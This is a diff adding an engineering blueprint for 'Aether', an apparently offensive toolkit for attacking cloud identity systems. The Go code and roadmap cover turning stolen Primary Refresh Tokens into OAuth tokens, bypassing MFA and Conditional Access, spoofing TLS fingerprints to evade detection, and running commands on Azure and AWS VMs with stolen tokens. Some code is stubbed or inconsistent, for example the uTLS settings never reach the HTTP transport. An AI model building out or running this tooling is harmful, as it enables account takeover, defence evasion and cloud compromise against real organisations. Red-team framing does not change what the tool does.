@@ -1,0 +1,1172 @@
+# Aether v1.0.0 — Complete Engineering Blueprint
+
+> **"The Impacket for the Hybrid Cloud Era"**
+> 
+> A unified, low-level protocol exploitation toolkit for modern identity fabrics (Entra ID, OAuth2, OIDC, SAML, WS-Trust, and cloud APIs).
+
+---
+
+## Table of Contents
+
+1. [Philosophy & Core Principles](#1-philosophy--core-principles)
+2. [High-Level Architecture](#2-high-level-architecture)
+3. [Project Structure](#3-project-structure)
+4. [Module Deep-Dives](#4-module-deep-dives)
+5. [Development Roadmap (Phased)](#5-development-roadmap-phased)
+6. [Technical Implementation Guide](#6-technical-implementation-guide)
+7. [Testing Strategy](#7-testing-strategy)
+8. [Packaging for Kali Linux](#8-packaging-for-kali-linux)
+9. [Appendix: Dependency Map](#9-appendix-dependency-map)
+
+---
+
+## 1. Philosophy & Core Principles
+
+### 1.1 The "Impacket" Standard
+
+Just as Impacket re-implemented Windows protocols (SMB, RPC, Kerberos) to enable offensive operations from Linux, **Aether re-implements modern identity protocols**:
+
+| Legacy (Impacket/Mimikatz) | Modern (Aether) |
+|----------------------------|-----------------|
+| Kerberos TGT | Primary Refresh Token (PRT) |
+| NTLM Hash | OAuth2 Refresh Token |
+| SMB/RPC | Microsoft Graph API / Azure Resource Manager |
+| Active Directory | Entra ID + Conditional Access |
+| `psexec` | `aether exec` (cloud VM command execution) |
+
+### 1.2 Design Principles
+
+1. **Protocol-Level, Not Wrapper-Level** — Aether implements protocols from the specification up. It does not wrap `curl` or invoke Python scripts.
+2. **Single Static Binary** — Zero runtime dependencies. One file, one job.
+3. **OPSEC-First** — Every action includes risk scoring and TLS fingerprint spoofing.
+4. **Extensible** — Plugin architecture for adding new identity providers and cloud APIs.
+5. **Auditable** — Every decision is logged with reasoning for purple team exercises.
+
+---
+
+## 2. High-Level Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                           AETHER v1.0.0                                    │
+│                        (Single Go Binary)                                  │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │                        CLI LAYER (Cobra)                            │   │
+│  │  aether prt │ aether relay │ aether cap │ aether exec │ aether validate │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                    │                                        │
+│  ┌─────────────────────────────────▼───────────────────────────────────┐   │
+│  │                     CORE ENGINE (Internal)                          │   │
+│  │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌───────────┐ │   │
+│  │  │ Token       │  │ Relay       │  │ CAP         │  │ Exec      │ │   │
+│  │  │ Engine      │  │ Engine      │  │ Engine      │  │ Engine    │ │   │
+│  │  └─────────────┘  └─────────────┘  └─────────────┘  └───────────┘ │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                    │                                        │
+│  ┌─────────────────────────────────▼───────────────────────────────────┐   │
+│  │                    PROTOCOL LAYER (Libraries)                       │   │
+│  │  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐ │   │
+│  │  │ OAuth2   │ │ OIDC     │ │ SAML     │ │ WS-Trust │ │ MS-OAPX  │ │   │
+│  │  └──────────┘ └──────────┘ └──────────┘ └──────────┘ └──────────┘ │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                    │                                        │
+│  ┌─────────────────────────────────▼───────────────────────────────────┐   │
+│  │                    TRANSPORT LAYER                                  │   │
+│  │  ┌──────────────────────────────────────────────────────────────┐  │   │
+│  │  │  uTLS (JA3/JA4 Spoofing)  │  HTTP/2  │  Retry/Backoff       │  │   │
+│  │  └──────────────────────────────────────────────────────────────┘  │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                    │                                        │
+│  ┌─────────────────────────────────▼───────────────────────────────────┐   │
+│  │                    PERSISTENCE LAYER                                │   │
+│  │  ┌──────────────────────────────────────────────────────────────┐  │   │
+│  │  │  BoltDB (Local KV Store)  │  JSON/YAML Config  │  Log Files  │  │   │
+│  │  └──────────────────────────────────────────────────────────────┘  │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 3. Project Structure
+
+```
+aether/
+├── cmd/
+│   └── aether/
+│       └── main.go                         # Entry point
+│
+├── internal/
+│   ├── cli/                                # Cobra commands
+│   │   ├── root.go
+│   │   ├── prt.go
+│   │   ├── relay.go
+│   │   ├── cap.go
+│   │   ├── exec.go
+│   │   └── validate.go
+│   │
+│   ├── engine/                             # Core business logic
+│   │   ├── token/
+│   │   │   ├── prt.go                      # PRT → OAuth conversion
+│   │   │   ├── saml.go                     # SAML assertion forging
+│   │   │   └── oidc.go                     # OIDC token manipulation
+│   │   ├── relay/
+│   │   │   ├── wstrust.go                  # WS-Trust client
+│   │   │   ├── devicecode.go               # OAuth Device Code flow
+│   │   │   └── session.go                  # Session stretching
+│   │   ├── cap/
+│   │   │   ├── parser.go                   # Conditional Access policy parse
+│   │   │   ├── evaluator.go                # Offline policy evaluation
+│   │   │   └── bypass.go                   # Bypass recommendation engine
+│   │   ├── exec/
+│   │   │   ├── azure.go                    # Azure VM RunCommand
+│   │   │   ├── aws.go                      # AWS SSM RunCommand
+│   │   │   └── github.go                   # GitHub Actions dispatch
+│   │   └── validate/
+│   │       ├── path.go                     # BloodHound path validation
+│   │       ├── risk.go                     # OPSEC risk scoring
+│   │       └── reporter.go                 # Engagement logging
+│   │
+│   ├── protocol/                           # Protocol implementations
+│   │   ├── oauth2/
+│   │   │   ├── client.go
+│   │   │   └── token.go
+│   │   ├── saml/
+│   │   │   ├── assertion.go
+│   │   │   └── signature.go
+│   │   ├── wstrust/
+│   │   │   ├── client.go
+│   │   │   └── request.go
+│   │   └── msoapx/
+│   │       ├── prt.go                      # MS-OAPX PRT protocol
+│   │       └── device.go                   # Device registration
+│   │
+│   ├── transport/                          # Network layer
+│   │   ├── tls.go                          # uTLS fingerprinting
+│   │   ├── http.go                         # Custom HTTP client
+│   │   └── retry.go                        # Exponential backoff
+│   │
+│   ├── store/                              # Persistence
+│   │   ├── bolt.go                         # BoltDB operations
+│   │   ├── config.go                       # Config management
+│   │   └── log.go                          # Structured logging
+│   │
+│   └── types/                              # Shared types
+│       ├── token.go
+│       ├── policy.go
+│       ├── path.go
+│       └── risk.go
+│
+├── pkg/                                    # Public (pluggable) APIs
+│   ├── providers/                          # Cloud provider interfaces
+│   │   ├── interface.go
+│   │   └── ...
+│   └── plugins/                            # Plugin system
+│       └── ...
+│
+├── test/
+│   ├── integration/
+│   └── mock/
+│
+├── docs/                                   # Documentation
+├── scripts/                                # Build scripts
+├── deploy/                                 # Packaging (deb, etc.)
+│   └── debian/
+│       ├── control
+│       ├── rules
+│       └── copyright
+│
+├── go.mod
+├── go.sum
+├── Makefile
+└── README.md
+```
+
+---
+
+## 4. Module Deep-Dives
+
+### 4.1 Module: `aether prt` — Token Forge Engine
+
+**Purpose:** Convert stolen Windows Primary Refresh Tokens (PRTs) into usable OAuth2 access tokens for Graph API, Azure, and AWS SSO — entirely from Linux.
+
+**Why This Matters:** A PRT is the modern equivalent of a Kerberos TGT. It's issued by Entra ID to Windows 10/11 devices and contains device + user claims. If you extract it from a compromised host, you can impersonate that device and user without their password or MFA.
+
+**Technical Implementation:**
+
+```go
+// internal/engine/token/prt.go
+
+package token
+
+import (
+    "crypto/rsa"
+    "crypto/x509"
+    "encoding/json"
+    "fmt"
+    "time"
+    
+    "github.com/AzureAD/microsoft-authentication-library-for-go/apps/public"
+    "github.com/golang-jwt/jwt/v5"
+)
+
+// PRT represents a Primary Refresh Token extracted from a Windows host
+type PRT struct {
+    Cookie      string            // The PRT cookie value
+    DeviceID    string            // Device identifier
+    TenantID    string            // Entra ID tenant
+    UserID      string            // User object ID
+    SessionKey  []byte            // Session key for encryption
+    Certificate *x509.Certificate // Device certificate (if available)
+}
+
+// PRTConverter handles PRT → OAuth token conversion
+type PRTConverter struct {
+    client *http.Client // Uses uTLS transport
+    logger *zap.Logger
+}
+
+// ConvertPRTToOAuth takes a PRT and returns OAuth2 tokens
+func (c *PRTConverter) ConvertPRTToOAuth(prt *PRT, resource string) (*OAuthTokens, error) {
+    // 1. Validate the PRT structure
+    if err := c.validatePRT(prt); err != nil {
+        return nil, fmt.Errorf("invalid PRT: %w", err)
+    }
+    
+    // 2. Build the MS-OAPX request (device authentication flow)
+    //    Ref: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-oapx/
+    req := c.buildPRTRequest(prt, resource)
+    
+    // 3. Send to Entra ID token endpoint with uTLS-spoofed fingerprint
+    resp, err := c.client.Do(req)
+    if err != nil {
+        return nil, fmt.Errorf("PRT exchange failed: %w", err)
+    }
+    defer resp.Body.Close()
+    
+    // 4. Parse and return tokens
+    var tokens OAuthTokens
+    if err := json.NewDecoder(resp.Body).Decode(&tokens); err != nil {
+        return nil, fmt.Errorf("failed to parse token response: %w", err)
+    }
+    
+    return &tokens, nil
+}
+
+// OAuthTokens represents the token response
+type OAuthTokens struct {
+    AccessToken  string `json:"access_token"`
+    RefreshToken string `json:"refresh_token"`
+    IDToken      string `json:"id_token"`
+    ExpiresIn    int    `json:"expires_in"`
+    TokenType    string `json:"token_type"`
+}
+```
+
+**Key Dependencies:**
+- `github.com/AzureAD/microsoft-authentication-library-for-go` — MSAL Go implementation
+- `github.com/golang-jwt/jwt/v5` — JWT parsing and validation
+- Custom MS-OAPX implementation (reverse-engineered from Windows protocol specs)
+
+**PRT Extraction (Input):** The user extracts the PRT cookie from a compromised Windows host using tools like `PRTextractor` or manual registry/browser dumping. They provide it to Aether as a JSON file or base64-encoded string.
+
+---
+
+### 4.2 Module: `aether relay` — MFA Bypass Engine
+
+**Purpose:** Act as a protocol proxy that captures and relays authentication flows to bypass Multi-Factor Authentication (MFA) using session stretching and WS-Trust/SAML federation.
+
+**Technical Implementation:**
+
+```go
+// internal/engine/relay/wstrust.go
+
+package relay
+
+import (
+    "bytes"
+    "encoding/xml"
+    "fmt"
+    "net/http"
+    
+    "github.com/rcastillo-se/signedxml" // Pure Go XML signing
+)
+
+// WSTrustClient handles WS-Trust protocol interactions
+// Ref: https://docs.oasis-open.org/ws-sx/ws-trust/v1.4/ws-trust.html
+type WSTrustClient struct {
+    httpClient *http.Client
+    endpoint   string // Typically https://{tenant}.login.microsoftonline.com/{tenant}/wstrust
+}
+
+// RequestSecurityToken builds a WS-Trust RST (Request Security Token) message
+func (c *WSTrustClient) RequestSecurityToken(username, password, appID string) (*SAMLAssertion, error) {
+    // Build the SOAP envelope with WS-Trust request
+    rst := c.buildRST(username, password, appID)
+    
+    // Send via uTLS-spoofed HTTP client
+    resp, err := c.httpClient.Post(c.endpoint, "application/soap+xml", bytes.NewReader(rst))
+    if err != nil {
+        return nil, err
+    }
+    defer resp.Body.Close()
+    
+    // Parse SAML assertion from response
+    var samlResp SAMLResponse
+    if err := xml.NewDecoder(resp.Body).Decode(&samlResp); err != nil {
+        return nil, err
+    }
+    
+    return &samlResp.Assertion, nil
+}
+
+// SessionStretcher extends a valid session beyond its normal lifetime
+type SessionStretcher struct {
+    originalToken  *OAuthTokens
+    refreshCount   int
+    maxRefresh     int
+}
+
+// StretchSession continuously refreshes a token to maintain access
+func (s *SessionStretcher) StretchSession() (*OAuthTokens, error) {
+    // Implementation of token refresh with backoff
+    // ...
+}
+```
+
+**Key Dependencies:**
+- `github.com/rcastillo-se/signedxml` — Pure Go XML signing for SAML assertions
+- Custom WS-Trust client implementation
+
+---
+
+### 4.3 Module: `aether cap` — Conditional Access Policy Evaluator
+
+**Purpose:** Parse and evaluate Entra ID Conditional Access policies **offline** to determine exactly what device OS, location, browser, and client app to spoof before executing any action.
+
+**Why This Matters:** Entra ID Conditional Access policies can block access based on device compliance, location, risk level, and more. By evaluating these policies offline, Aether can tell the operator exactly what to spoof — avoiding trial-and-error that would trigger alerts.
+
+**Technical Implementation:**
+
+```go
+// internal/engine/cap/parser.go
+
+package cap
+
+import (
+    "encoding/json"
+    "fmt"
+    
+    "github.com/microsoftgraph/msgraph-sdk-go/models" // MS Graph SDK
+)
+
+// ConditionalAccessPolicy represents an Entra ID CAP
+type ConditionalAccessPolicy struct {
+    ID          string   `json:"id"`
+    DisplayName string   `json:"displayName"`
+    State       string   `json:"state"` // "enabled", "disabled", "enabledForReportingButNotEnforced"
+    Conditions  Conditions `json:"conditions"`
+    GrantControls GrantControls `json:"grantControls"`
+}
+
+type Conditions struct {
+    Applications  ApplicationCondition `json:"applications"`
+    Users         UserCondition        `json:"users"`
+    Locations     LocationCondition    `json:"locations"`
+    Platforms     PlatformCondition    `json:"platforms"`     // Windows, iOS, Android, macOS
+    ClientApps    ClientAppCondition   `json:"clientApps"`    // Browser, Mobile, Exchange ActiveSync
+    DeviceStates  DeviceStateCondition `json:"deviceStates"`  // Compliant, Domain-joined
+    SignInRisk    string               `json:"signInRisk"`    // High, Medium, Low, None
+    UserRisk      string               `json:"userRisk"`
+}
+
+type GrantControls struct {
+    Operator          string   `json:"operator"`           // "AND", "OR"
+    BuiltInControls   []string `json:"builtInControls"`    // "mfa", "compliantDevice", "domainJoinedDevice"
+    CustomControls    []string `json:"customControls"`
+}
+
+// CAPEvaluator evaluates policies offline to find bypass strategies
+type CAPEvaluator struct {
+    policies []ConditionalAccessPolicy
+}
+
+// Evaluate returns a BypassStrategy based on policy analysis
+func (e *CAPEvaluator) Evaluate(targetUser string, targetApp string) (*BypassStrategy, error) {
+    var applicablePolicies []ConditionalAccessPolicy
+    
+    // 1. Filter policies that apply to this user + app
+    for _, policy := range e.policies {
+        if e.isApplicable(policy, targetUser, targetApp) {
+            applicablePolicies = append(applicablePolicies, policy)
+        }
+    }
+    
+    // 2. Build the "strictest" set of requirements
+    requirements := e.aggregateRequirements(applicablePolicies)
+    
+    // 3. Generate bypass strategy
+    strategy := &BypassStrategy{
+        RequiredOS:        e.determineOS(requirements),
+        RequiredLocation:  e.determineLocation(requirements),
+        RequiredBrowser:   e.determineBrowser(requirements),
+        RequiredDeviceCompliance: requirements.DeviceCompliant,
+        RiskLevel:         e.calculateRisk(requirements),
+        SpoofingRecommendations: e.generateSpoofs(requirements),
+    }
+    
+    return strategy, nil
+}
+
+// BypassStrategy tells the operator exactly what to spoof
+type BypassStrategy struct {
+    RequiredOS             string   // "Windows10", "iOS", "Android"
+    RequiredLocation       string   // "US-East", "Europe"
+    RequiredBrowser        string   // "Edge", "Chrome", "Safari"
+    RequiredDeviceCompliance bool   // true if device must be compliant
+    RiskLevel              int      // 0-100
+    SpoofingRecommendations []string // Human-readable recommendations
+}
+```
+
+**Key Dependencies:**
+- `github.com/microsoftgraph/msgraph-sdk-go` — Microsoft Graph SDK for policy retrieval
+- Custom policy aggregation logic
+
+---
+
+### 4.4 Module: `aether exec` — Cloud Pivot Engine
+
+**Purpose:** Execute remote commands on cloud VMs, CI/CD runners, and managed servers using valid OAuth tokens — the cloud-native equivalent of Impacket's `psexec` or `wmiexec`.
+
+**Technical Implementation:**
+
+```go
+// internal/engine/exec/azure.go
+
+package exec
+
+import (
+    "context"
+    "fmt"
+    
+    "github.com/Azure/azure-sdk-for-go/sdk/azidentity"
+    "github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/compute/armcompute"
+)
+
+// AzureExecutor executes commands on Azure VMs via RunCommand
+type AzureExecutor struct {
+    subscriptionID string
+    token          *OAuthTokens
+    httpClient     *http.Client // uTLS-wrapped
+}
+
+// ExecuteOnAzureVM runs a command on an Azure VM
+func (e *AzureExecutor) ExecuteOnAzureVM(ctx context.Context, vmID, resourceGroup, command string) (*CommandResult, error) {
+    // 1. Create credential from token
+    cred := e.createTokenCredential()
+    
+    // 2. Initialize Azure Compute client
+    client, err := armcompute.NewVirtualMachinesClient(e.subscriptionID, cred, nil)
+    if err != nil {
+        return nil, fmt.Errorf("failed to create Azure client: %w", err)
+    }
+    
+    // 3. Build RunCommand request
+    runCommand := &armcompute.RunCommandInput{
+        CommandID: ptr.String("RunShellScript"),
+        Script:    []string{command},
+    }
+    
+    // 4. Execute
+    poller, err := client.BeginRunCommand(ctx, resourceGroup, vmID, runCommand, nil)
+    if err != nil {
+        return nil, fmt.Errorf("RunCommand failed: %w", err)
+    }
+    
+    resp, err := poller.PollUntilDone(ctx, nil)
+    if err != nil {
+        return nil, err
+    }
+    
+    // 5. Parse and return output
+    return &CommandResult{
+        Output:   *resp.Value.Message,
+        ExitCode: *resp.Value.ExitCode,
+    }, nil
+}
+
+// AWSExecutor executes commands on AWS EC2 via SSM RunCommand
+type AWSExecutor struct {
+    region string
+    token  *OAuthTokens // AWS SSO token
+}
+
+func (e *AWSExecutor) ExecuteOnEC2(ctx context.Context, instanceID, command string) (*CommandResult, error) {
+    // Similar implementation using AWS SDK
+    // ...
+}
+```
+
+**Key Dependencies:**
+- `github.com/Azure/azure-sdk-for-go/sdk/azidentity` — Azure credential handling
+- `github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/compute/armcompute` — Azure VM management
+- `github.com/aws/aws-sdk-go-v2/service/ssm` — AWS SSM RunCommand
+
+---
+
+### 4.5 Module: `aether validate` — Path Validation & OPSEC Engine
+
+**Purpose:** Take attack paths from BloodHound/ROADtools, validate them non-destructively, and assign unified OPSEC risk scores.
+
+**Technical Implementation:**
+
+```go
+// internal/engine/validate/path.go
+
+package validate
+
+import (
+    "encoding/json"
+    "os"
+)
+
+// AttackPath represents a path from BloodHound JSON export
+type AttackPath struct {
+    Nodes []PathNode `json:"nodes"`
+    Edges []PathEdge `json:"edges"`
+}
+
+type PathNode struct {
+    ID         string            `json:"id"`
+    Label      string            `json:"label"`      // "User", "Group", "Computer", "OU"
+    Properties map[string]string `json:"properties"`
+}
+
+type PathEdge struct {
+    Source string `json:"source"`
+    Target string `json:"target"`
+    Type   string `json:"type"`   // "MemberOf", "HasSession", "AdminTo"
+}
+
+// PathValidator validates that an attack path is actually exploitable
+type PathValidator struct {
+    token      *OAuthTokens
+    httpClient *http.Client
+}
+
+// ValidatePath checks each step in the path
+func (v *PathValidator) ValidatePath(path *AttackPath) (*ValidationResult, error) {
+    result := &ValidationResult{
+        Steps:      []StepResult{},
+        OverallRisk: 0,
+        IsValid:    true,
+    }
+    
+    for i, step := range path.Edges {
+        stepResult := v.validateStep(step, path)
+        result.Steps = append(result.Steps, stepResult)
+        
+        if !stepResult.Valid {
+            result.IsValid = false
+        }
+        
+        // Accumulate risk
+        result.OverallRisk += stepResult.RiskScore
+    }
+    
+    // Normalize risk to 0-100
+    if len(result.Steps) > 0 {
+        result.OverallRisk = result.OverallRisk / len(result.Steps)
+    }
+    
+    return result, nil
+}
+
+// RiskScorer calculates OPSEC risk for an action
+type RiskScorer struct {
+    edrDetected    bool
+    siemLogging    bool
+    blueTeamActive bool
+    timeOfDay      string // "business_hours", "off_hours"
+}
+
+func (r *RiskScorer) ScoreAction(action string, target string) (int, string, error) {
+    baseRisk := r.getBaseRisk(action)
+    
+    // Adjust for environmental factors
+    if r.edrDetected {
+        baseRisk += 20
+    }
+    if r.siemLogging {
+        baseRisk += 15
+    }
+    if r.blueTeamActive {
+        baseRisk += 25
+    }
+    if r.timeOfDay == "business_hours" {
+        baseRisk += 10
+    }
+    
+    if baseRisk > 100 {
+        baseRisk = 100
+    }
+    
+    reasoning := fmt.Sprintf("Base risk %d + EDR(%t) + SIEM(%t) + BlueTeam(%t) + Time(%s)",
+        r.getBaseRisk(action), r.edrDetected, r.siemLogging, r.blueTeamActive, r.timeOfDay)
+    
+    return baseRisk, reasoning, nil
+}
+```
+
+---
+
+## 5. Development Roadmap (Phased)
+
+### Phase 0: Foundation (Weeks 1-2)
+**Goal:** Project skeleton, build system, and core transport layer.
+
+| Task | Deliverable | Dependencies |
+|------|-------------|--------------|
+| Initialize Go module | `go.mod`, `go.sum` | None |
+| Set up Cobra CLI framework | `cmd/aether/main.go`, all subcommands | `github.com/spf13/cobra` |
+| Implement uTLS HTTP client | `internal/transport/tls.go` | `github.com/refraction-networking/utls` |
+| Set up structured logging | `internal/store/log.go` | `go.uber.org/zap` |
+| Create BoltDB store | `internal/store/bolt.go` | `go.etcd.io/bbolt` |
+| Build system (Makefile) | `Makefile` with build/test/clean targets | None |
+
+**Validation:** `make build` produces a working binary that prints `aether version 1.0.0`.
+
+---
+
+### Phase 1: Core Protocol Implementation (Weeks 3-6)
+**Goal:** Implement all protocol layers.
+
+#### Week 3-4: OAuth2 & OIDC
+| Task | Deliverable | Dependencies |
+|------|-------------|--------------|
+| OAuth2 client implementation | `internal/protocol/oauth2/client.go` | `golang.org/x/oauth2` |
+| Device Code flow | `internal/protocol/oauth2/device.go` | `golang.org/x/oauth2` |
+| Token parsing & validation | `internal/protocol/oauth2/token.go` | `github.com/golang-jwt/jwt/v5` |
+| OIDC discovery | `internal/protocol/oidc/discovery.go` | Custom implementation |
+
+#### Week 5: SAML & WS-Trust
+| Task | Deliverable | Dependencies |
+|------|-------------|--------------|
+| SAML assertion builder | `internal/protocol/saml/assertion.go` | `encoding/xml` |
+| XML signing | `internal/protocol/saml/signature.go` | `github.com/rcastillo-se/signedxml` |
+| WS-Trust client | `internal/protocol/wstrust/client.go` | Custom implementation |
+| SAML token parsing | `internal/protocol/saml/parser.go` | `encoding/xml` |
+
+#### Week 6: MS-OAPX (PRT Protocol)
+| Task | Deliverable | Dependencies |
+|------|-------------|--------------|
+| PRT data structure | `internal/protocol/msoapx/prt.go` | Custom implementation |
+| PRT → OAuth exchange | `internal/protocol/msoapx/exchange.go` | MS-OAPX spec |
+| Device registration | `internal/protocol/msoapx/device.go` | Custom implementation |
+
+**Validation:** Unit tests pass for all protocol parsers. Integration tests with Entra ID sandbox succeed.
+
+---
+
+### Phase 2: Engine Implementation (Weeks 7-10)
+**Goal:** Build the five core engines.
+
+#### Week 7: Token Engine (`aether prt`)
+| Task | Deliverable | Dependencies |
+|------|-------------|--------------|
+| PRT converter | `internal/engine/token/prt.go` | Phase 1 MS-OAPX |
+| SAML forger | `internal/engine/token/saml.go` | Phase 1 SAML |
+| OIDC token manipulator | `internal/engine/token/oidc.go` | Phase 1 OIDC |
+
+#### Week 8: Relay Engine (`aether relay`)
+| Task | Deliverable | Dependencies |
+|------|-------------|--------------|
+| WS-Trust relay | `internal/engine/relay/wstrust.go` | Phase 1 WS-Trust |
+| Device Code relay | `internal/engine/relay/devicecode.go` | Phase 1 OAuth2 |
+| Session stretcher | `internal/engine/relay/session.go` | Token refresh logic |
+
+#### Week 9: CAP Engine (`aether cap`)
+| Task | Deliverable | Dependencies |
+|------|-------------|--------------|
+| Policy parser | `internal/engine/cap/parser.go` | MS Graph SDK |
+| Policy evaluator | `internal/engine/cap/evaluator.go` | Policy parser |
+| Bypass generator | `internal/engine/cap/bypass.go` | Evaluator |
+
+#### Week 10: Exec & Validate Engines
+| Task | Deliverable | Dependencies |
+|------|-------------|--------------|
+| Azure executor | `internal/engine/exec/azure.go` | Azure SDK |
+| AWS executor | `internal/engine/exec/aws.go` | AWS SDK |
+| Path validator | `internal/engine/validate/path.go` | JSON parsing |
+| Risk scorer | `internal/engine/validate/risk.go` | Environmental detection |
+| Reporter | `internal/engine/validate/reporter.go` | Markdown/JSON generation |
+
+**Validation:** Each engine has working end-to-end tests against test tenants/cloud accounts.
+
+---
+
+### Phase 3: CLI Integration (Weeks 11-12)
+**Goal:** Wire all engines to Cobra commands with clean UX.
+
+| Task | Deliverable |
+|------|-------------|
+| `aether prt convert` | CLI flags: `--prt-file`, `--output`, `--resource` |
+| `aether relay mfa` | CLI flags: `--token`, `--app`, `--spoof-os`, `--spoof-ip` |
+| `aether cap parse` | CLI flags: `--tenant-id`, `--token`, `--output` |
+| `aether exec azure` | CLI flags: `--token`, `--vm-id`, `--cmd`, `--resource-group` |
+| `aether validate path` | CLI flags: `--bh-json`, `--actions-log`, `--risk-threshold` |
+| Global flags | `--verbose`, `--config`, `--log-file`, `--timeout` |
+
+**Validation:** All commands work end-to-end with realistic test scenarios.
+
+---
+
+### Phase 4: Testing & Hardening (Weeks 13-14)
+| Task | Deliverable |
+|------|-------------|
+| Unit test coverage >80% | `go test -cover` |
+| Integration test suite | Tests against Entra ID sandbox, Azure free tier |
+| Error handling & retry logic | Exponential backoff, graceful failures |
+| OPSEC hardening | Remove all debug symbols, strip binary |
+| Documentation | `README.md`, man pages, `--help` for all commands |
+
+---
+
+### Phase 5: Packaging & Release (Week 15)
+| Task | Deliverable |
+|------|-------------|
+| Debian packaging | `debian/` directory with `control`, `rules`, `copyright` |
+| Cross-compilation | `make build-all` (linux/amd64, linux/arm64) |
+| GPG signing | Signed release binaries |
+| GitHub Release | v1.0.0 tagged release with assets |
+| Kali submission | Submit to Kali bug tracker |
+
+---
+
+## 6. Technical Implementation Guide
+
+### 6.1 Setting Up the Project
+
+```bash
+# Initialize module
+mkdir aether && cd aether
+go mod init github.com/yourusername/aether
+
+# Install core dependencies
+go get -u github.com/spf13/cobra
+go get -u github.com/spf13/viper
+go get -u go.uber.org/zap
+go get -u go.etcd.io/bbolt
+go get -u github.com/refraction-networking/utls
+go get -u golang.org/x/oauth2
+go get -u github.com/golang-jwt/jwt/v5
+go get -u github.com/Azure/azure-sdk-for-go/sdk/azidentity
+go get -u github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/compute/armcompute
+go get -u github.com/aws/aws-sdk-go-v2/service/ssm
+go get -u github.com/microsoftgraph/msgraph-sdk-go
+go get -u github.com/rcastillo-se/signedxml
+
+# Create directory structure
+mkdir -p cmd/aether internal/{cli,engine,protocol,transport,store,types} pkg/{providers,plugins} test/{integration,mock} docs scripts deploy/debian
+```
+
+### 6.2 The uTLS Transport (Critical for CAP Bypass)
+
+```go
+// internal/transport/tls.go
+
+package transport
+
+import (
+    "crypto/tls"
+    "net/http"
+    "time"
+    
+    "github.com/refraction-networking/utls"
+)
+
+// BrowserPreset defines which browser to impersonate
+type BrowserPreset string
+
+const (
+    Chrome120 BrowserPreset = "chrome_120"
+    Edge120   BrowserPreset = "edge_120"
+    Firefox120 BrowserPreset = "firefox_120"
+)
+
+// NewUTLSClient creates an HTTP client with JA3/JA4 spoofing
+func NewUTLSClient(preset BrowserPreset) *http.Client {
+    // Create uTLS config with browser fingerprint
+    var spec utls.ClientHelloSpec
+    
+    switch preset {
+    case Chrome120:
+        spec = utls.HelloChrome_120_ClientHello
+    case Edge120:
+        spec = utls.HelloEdge_120_ClientHello
+    case Firefox120:
+        spec = utls.HelloFirefox_120_ClientHello
+    default:
+        spec = utls.HelloChrome_120_ClientHello
+    }
+    
+    // Build uTLS connection
+    config := utls.Config{
+        ClientHelloID: &utls.ClientHelloID{
+            Client:  spec,
+            Version: utls.VersionTLS13,
+        },
+        InsecureSkipVerify: false, // Never skip in production
+    }
+    
+    // Create HTTP client with custom transport
+    return &http.Client{
+        Transport: &http.Transport{
+            TLSClientConfig: &tls.Config{
+                // uTLS handles the actual fingerprint
+            },
+            ForceAttemptHTTP2: true,
+            MaxIdleConns:      100,
+            IdleConnTimeout:   90 * time.Second,
+        },
+        Timeout: 30 * time.Second,
+    }
+}
+```
+
+### 6.3 Configuration Management
+
+```go
+// internal/store/config.go
+
+package store
+
+import (
+    "encoding/json"
+    "os"
+    "path/filepath"
+)
+
+// Config represents Aether's configuration
+type Config struct {
+    // General
+    LogLevel     string `json:"log_level"`      // debug, info, warn, error
+    LogFile      string `json:"log_file"`       // Path to log file
+    Timeout      int    `json:"timeout"`        // Default timeout in seconds
+    
+    // TLS Fingerprinting
+    BrowserPreset string `json:"browser_preset"` // chrome, edge, firefox
+    
+    // OPSEC
+    MaxRiskThreshold int `json:"max_risk_threshold"` // 0-100
+    
+    // Cloud Providers
+    Azure struct {
+        SubscriptionID string `json:"subscription_id"`
+    } `json:"azure"`
+    
+    AWS struct {
+        Region string `json:"region"`
+    } `json:"aws"`
+}
+
+// DefaultConfig returns sensible defaults
+func DefaultConfig() *Config {
+    return &Config{
+        LogLevel:         "info",
+        Timeout:          30,
+        BrowserPreset:    "chrome",
+        MaxRiskThreshold: 50,
+    }
+}
+
+// LoadConfig loads from file or creates default
+func LoadConfig(path string) (*Config, error) {
+    if path == "" {
+        // Check default locations
+        locations := []string{
+            "./aether.json",
+            os.ExpandEnv("$HOME/.config/aether/config.json"),
+            "/etc/aether/config.json",
+        }
+        for _, loc := range locations {
+            if _, err := os.Stat(loc); err == nil {
+                path = loc
+                break
+            }
+        }
+    }
+    
+    if path == "" {
+        return DefaultConfig(), nil
+    }
+    
+    data, err := os.ReadFile(path)
+    if err != nil {
+        return nil, err
+    }
+    
+    var cfg Config
+    if err := json.Unmarshal(data, &cfg); err != nil {
+        return nil, err
+    }
+    
+    return &cfg, nil
+}
+```
+
+### 6.4 Structured Logging with OPSEC in Mind
+
+```go
+// internal/store/log.go
+
+package store
+
+import (
+    "os"
+    
+    "go.uber.org/zap"
+    "go.uber.org/zap/zapcore"
+)
+
+// NewLogger creates a structured logger with OPSEC-aware formatting
+func NewLogger(level string, logFile string) (*zap.Logger, error) {
+    var config zap.Config
+    
+    if logFile != "" {
+        // File logging - include full details for reporting
+        config = zap.NewProductionConfig()
+        config.OutputPaths = []string{logFile}
+        config.ErrorOutputPaths = []string{logFile}
+    } else {
+        // Console logging - minimal for OPSEC (don't leak sensitive data to terminal)
+        config = zap.NewDevelopmentConfig()
+        config.EncoderConfig.EncodeLevel = zapcore.CapitalColorLevelEncoder
+        config.OutputPaths = []string{"stderr"}
+    }
+    
+    // Set log level
+    var lvl zapcore.Level
+    if err := lvl.UnmarshalText([]byte(level)); err != nil {
+        lvl = zapcore.InfoLevel
+    }
+    config.Level = zap.NewAtomicLevelAt(lvl)
+    
+    // Build logger with redaction
+    logger, err := config.Build()
+    if err != nil {
